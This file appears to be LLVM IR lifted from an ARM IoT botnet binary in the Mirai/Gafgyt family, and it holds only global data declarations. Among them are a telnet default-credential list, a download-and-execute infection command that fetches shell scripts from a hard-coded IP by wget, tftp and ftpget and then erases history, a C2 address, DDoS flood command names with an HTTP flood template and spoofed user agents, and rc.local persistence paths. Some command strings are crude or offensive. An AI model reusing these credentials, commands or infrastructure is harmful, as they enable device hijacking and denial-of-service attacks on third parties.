source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_2600c.14 = global i32 0
@global_var_e698.18 = constant i32 -509558771
@global_var_264b8.21 = global i32 0
@global_var_264bc.22 = local_unnamed_addr global i32 0
@global_var_264c0.23 = local_unnamed_addr global i32 0
@global_var_26214.26 = local_unnamed_addr global i32 4095
@global_var_26210.29 = global i32 362436
@global_var_1bbec.31 = constant [7 x i8] c"(null)\00"
@global_var_2a4b8.33 = local_unnamed_addr global i32 0
@global_var_1bbf4.35 = constant [8 x i8] c"/bin/sh\00"
@global_var_1bbfc.37 = constant [3 x i8] c"sh\00"
@global_var_1bc00.39 = constant [3 x i8] c"-c\00"
@global_var_1bc04.42 = constant i32 -1
@global_var_26498.45 = global i32 0
@global_var_1bbdc.47 = constant [8 x i8] c"busybox\00"
@global_var_1bbe4.48 = constant i32 36
@global_var_1bbe8.49 = constant i32 35
@global_var_261d4.50 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bbdc.47, i32 0, i32 0), i8* bitcast (i32* @global_var_1bbe4.48 to i8*), i8* bitcast (i32* @global_var_1bbe8.49 to i8*)]
@global_var_1bba4.52 = constant [7 x i8] c"nvalid\00"
@global_var_1bbac.53 = constant [6 x i8] c"ailed\00"
@global_var_1bbb4.54 = constant [9 x i8] c"ncorrect\00"
@global_var_1bbc0.55 = constant [6 x i8] c"enied\00"
@global_var_1bbc8.56 = constant [5 x i8] c"rror\00"
@global_var_1bbd0.57 = constant [7 x i8] c"oodbye\00"
@global_var_1bbd8.58 = constant [4 x i8] c"bad\00"
@global_var_261b4.59 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bba4.52, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bbac.53, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bbb4.54, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bbc0.55, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbc8.56, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bbd0.57, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bbd8.58, i32 0, i32 0)]
@global_var_264a0.61 = global i32 0
@global_var_264a4.62 = local_unnamed_addr global i32 0
@global_var_2c708.64 = global i32 0
@global_var_1c004.66 = constant [6 x i8] c":>%$#\00"
@global_var_1c00c.75 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_2c6fc.77 = global i32 0
@global_var_1bb28.79 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_1bb38.80 = constant [6 x i8] c"/tmp/\00"
@global_var_1bb40.81 = constant [6 x i8] c"/var/\00"
@global_var_1bb48.82 = constant [6 x i8] c"/dev/\00"
@global_var_1bb50.83 = constant [10 x i8] c"/var/run/\00"
@global_var_1bb5c.84 = constant [10 x i8] c"/dev/shm/\00"
@global_var_1bb68.85 = constant [6 x i8] c"/mnt/\00"
@global_var_1bb70.86 = constant [7 x i8] c"/boot/\00"
@global_var_1bb78.87 = constant [6 x i8] c"/usr/\00"
@global_var_1bb80.88 = constant [6 x i8] c"/opt/\00"
@global_var_26174.89 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1bb28.79, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bb38.80, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bb40.81, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bb48.82, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1bb50.83, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1bb5c.84, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bb68.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bb70.86, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bb78.87, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bb80.88, i32 0, i32 0)]
@global_var_261a0 = external global i32
@global_var_1badc.96 = constant [7 x i8] c"telnet\00"
@global_var_1bae4.97 = constant [5 x i8] c"root\00"
@global_var_1baec.98 = constant [8 x i8] c"default\00"
@global_var_1baf8.99 = constant [7 x i8] c"daemon\00"
@global_var_1bb00.100 = constant [8 x i8] c"support\00"
@global_var_1bb0c.101 = constant i32 0
@global_var_1bb10.102 = constant [7 x i8] c"123456\00"
@global_var_1bb18.103 = constant [7 x i8] c"Zte521\00"
@global_var_1bb20.104 = constant [6 x i8] c"vizxv\00"
@global_var_26128.105 = global [18 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1badc.96, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bae4.97, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bae4.97, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bae4.97, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bae4.97, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bae4.97, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1baec.98, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1baf8.99, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bb00.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1badc.96, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bae4.97, i32 0, i32 0), i8* bitcast (i32* @global_var_1bb0c.101 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bb10.102, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bb18.103, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bb20.104, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1baec.98, i32 0, i32 0), i8* bitcast (i32* @global_var_1bb0c.101 to i8*), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bb00.100, i32 0, i32 0)]
@global_var_1c018.107 = constant [3 x i8] c"\0D\0A\00"
@global_var_2614c.109 = global [9 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1badc.96, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bae4.97, i32 0, i32 0), i8* bitcast (i32* @global_var_1bb0c.101 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bb10.102, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bb18.103, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bb20.104, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1baec.98, i32 0, i32 0), i8* bitcast (i32* @global_var_1bb0c.101 to i8*), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bb00.100, i32 0, i32 0)]
@global_var_261e4.111 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bba4.52, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bbac.53, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bbb4.54, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bbc0.55, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbc8.56, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bbd0.57, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bbd8.58, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bbdc.47, i32 0, i32 0), i8* bitcast (i32* @global_var_1bbe4.48 to i8*), i8* bitcast (i32* @global_var_1bbe8.49 to i8*)]
@global_var_1c01c.114 = constant i32 993090331
@global_var_1c07c.116 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_1c084.118 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_1b93c.120 = constant [415 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.205.175/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 165.227.205.175 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 165.227.205.175; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 165.227.205.175 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *;history -c\0D\0A\00"
@global_var_26124.121 = local_unnamed_addr global [415 x i8]* @global_var_1b93c.120
@global_var_1c08c.123 = constant [6 x i8] c"arfgG\00"
@global_var_1c094.124 = constant [9 x i8] c"HBiug655\00"
@global_var_1c0a0.125 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_1c0b0.126 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_1c0c4.127 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_1c0d8.128 = constant [12 x i8] c"GJjyur67458\00"
@global_var_1c0e4.129 = constant [12 x i8] c"RYSDk747586\00"
@global_var_1c0f0.130 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_1c0fc.131 = constant [10 x i8] c"KHGK7985i\00"
@global_var_1c108.132 = constant [11 x i8] c"yuituiILYF\00"
@global_var_1c114.133 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_1c124.134 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_1c130.135 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_1c140.136 = constant [9 x i8] c"ewqdcftr\00"
@global_var_1c14c.137 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_1c15c.138 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_1c168.139 = constant [12 x i8] c"twehgbferhb\00"
@global_var_1c174.140 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_1c180.141 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_1c190.142 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_1c1a0.143 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_1c1b0.144 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_1c1bc.145 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_1c1cc.146 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_1c1dc.147 = constant [12 x i8] c"yteytietyue\00"
@global_var_1c1e8.148 = constant [9 x i8] c"qsortEQS\00"
@global_var_1c1f4.149 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_1c204.150 = constant [4 x i8] c"std\00"
@global_var_1c208.151 = constant [4 x i8] c"dts\00"
@global_var_1c20c.152 = constant [4 x i8] c"lsk\00"
@global_var_1c210.153 = constant [4 x i8] c"kek\00"
@global_var_1c214.154 = constant [6 x i8] c"smack\00"
@global_var_1c21c.155 = constant [4 x i8] c"ily\00"
@global_var_1c220.156 = constant [4 x i8] c"tyf\00"
@global_var_1c224.157 = constant [4 x i8] c"pos\00"
@global_var_1c228.158 = constant [6 x i8] c"cunts\00"
@global_var_1c230.159 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c08c.123, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c094.124, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1c0a0.125, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1c0b0.126, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1c0c4.127, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1c0d8.128, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1c0e4.129, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1c0f0.130, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1c0fc.131, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1c108.132, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1c114.133, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1c124.134, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1c130.135, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c140.136, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1c14c.137, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1c15c.138, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1c168.139, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1c174.140, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1c180.141, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1c190.142, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1c1a0.143, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1c1b0.144, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1c1bc.145, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1c1cc.146, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1c1dc.147, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c1e8.148, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1c1f4.149, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c204.150, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c208.151, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c20c.152, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c210.153, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c214.154, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c21c.155, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c220.156, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c224.157, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c228.158, i32 0, i32 0)]
@global_var_1ac48.163 = constant [64 x i8] c"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_1ac88.164 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_1accc.165 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_1ad10.166 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_1ad54.167 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_1ad98.168 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_1addc.169 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_1ae20.170 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_1ae90.171 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_1af04.172 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_1af50.173 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_1afd8.174 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_1b024.175 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_1b094.176 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_1b104.177 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_1b178.178 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_1b1f0.179 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_1b238.180 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_1b268.181 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_1b2a8.182 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_1b2f4.183 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_1b36c.184 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_1b3dc.185 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_1b44c.186 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_1b4c0.187 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_1b554.188 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_1b59c.189 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_1b5e4.190 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_1b624.191 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_1b6a0.192 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_1b708.193 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_1b784.194 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_1b7d4.195 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_1b828.196 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_1b87c.197 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_1b8d0.198 = constant [83 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0\00"
@global_var_1b924.199 = constant [21 x i8] c"165.227.205.175:6767\00"
@global_var_26090.200 = global [37 x i8*] [i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1ac48.163, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @global_var_1ac88.164, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1accc.165, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1ad10.166, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1ad54.167, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1ad98.168, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1addc.169, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_1ae20.170, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1ae90.171, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1af04.172, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @global_var_1af50.173, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1afd8.174, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_1b024.175, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_1b094.176, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1b104.177, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @global_var_1b178.178, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_1b1f0.179, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_1b238.180, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_1b268.181, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1b2a8.182, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @global_var_1b2f4.183, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @global_var_1b36c.184, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_1b3dc.185, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1b44c.186, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @global_var_1b4c0.187, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_1b554.188, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_1b59c.189, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1b5e4.190, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_1b624.191, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @global_var_1b6a0.192, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_1b708.193, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_1b784.194, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_1b7d4.195, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_1b828.196, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_1b87c.197, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_1b8d0.198, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_1b924.199, i32 0, i32 0)]
@global_var_c920.201 = constant i32 115392
@global_var_1c2c0.202 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_1c300.204 = constant [4 x i8] c"all\00"
@global_var_1c304.206 = constant i32 44
@global_var_1c308.208 = constant [4 x i8] c"syn\00"
@global_var_1c30c.210 = constant [4 x i8] c"rst\00"
@global_var_1c310.212 = constant [4 x i8] c"fin\00"
@global_var_1c314.214 = constant [4 x i8] c"ack\00"
@global_var_1c318.216 = constant [4 x i8] c"psh\00"
@global_var_1c31c.218 = constant [5 x i8] c"PING\00"
@global_var_1c324.220 = constant [6 x i8] c"PUSSY\00"
@global_var_1c32c.222 = constant [4 x i8] c"OFF\00"
@global_var_2c704.224 = global i32 0
@global_var_1c330.226 = constant [3 x i8] c"ON\00"
@global_var_1c334.228 = constant [5 x i8] c"HTTP\00"
@global_var_1c33c.231 = constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00"
@global_var_1c364.233 = constant [4 x i8] c"UDP\00"
@global_var_ffdc.234 = constant i32 -509607926
@global_var_1c368.237 = constant [4 x i8] c"TCP\00"
@global_var_1c36c.239 = constant [4 x i8] c"STD\00"
@global_var_1c370.241 = constant [9 x i8] c"KILLATTK\00"
@global_var_26170.246 = local_unnamed_addr global i32 -1
@global_var_26120.248 = global [21 x i8]* @global_var_1b924.199
@global_var_1c37c.250 = constant [8 x i8] c"8.8.8.8\00"
@global_var_1c384.253 = constant [16 x i8] c"/proc/net/route\00"
@global_var_1c394.255 = constant [11 x i8] c"\0900000000\09\00"
@global_var_264a8.257 = global i32 0
@global_var_1c3a0.259 = constant [6 x i8] c"ARM-4\00"
@global_var_1c3a8.261 = constant i32 0
@global_var_1c3ac.263 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 114
@global_var_1c3c4.267 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_1c3d4.269 = constant i32 47
@global_var_1c3d8.271 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_1c3e0.273 = constant i32 97
@global_var_1c3e4.275 = constant [13 x i8] c"fork failed\0A\00"
@global_var_1c3f4.279 = constant i32 993090331
@global_var_1c458.284 = constant [9 x i8] c"LELIMDUP\00"
@global_var_1c464.286 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_1c478.288 = constant [11 x i8] c"STOLENBOTS\00"
@global_var_1c484.290 = constant [8 x i8] c"%s 2>&1\00"
@global_var_1c48c.292 = constant i32 32
@global_var_f634.293 = constant i32 92652
@global_var_11604.308 = constant i32 -382906384
@global_var_1363c.312 = constant i32 -382909968
@global_var_10050.327 = constant i32 -509607926
@global_var_10220.337 = constant i32 -382910448
@global_var_15c2c.338 = constant i32 -382909968
@global_var_15ce0.339 = constant i32 -382910224
@global_var_11374.373 = constant i32 -509607928
@global_var_11a1c.400 = constant i32 -456978431
@global_var_13a7c.431 = constant i32 -516948194
@global_var_12760.438 = constant i32 -478871519
@global_var_130ac.446 = constant i32 -478805983
@global_var_13488.455 = constant i32 -382906384
@global_var_f9e0.464 = constant i32 -509591552
@global_var_13a48.470 = constant i32 -442564540
@global_var_142f0.512 = constant i32 -494075872
@global_var_fa0c.513 = constant i32 -382910336
@global_var_144b0.525 = constant i32 -369098421
@global_var_138b8.544 = constant i32 -442543860
@global_var_11ad0.553 = constant i32 -369093626
@global_var_14f78.566 = constant i32 -335545191
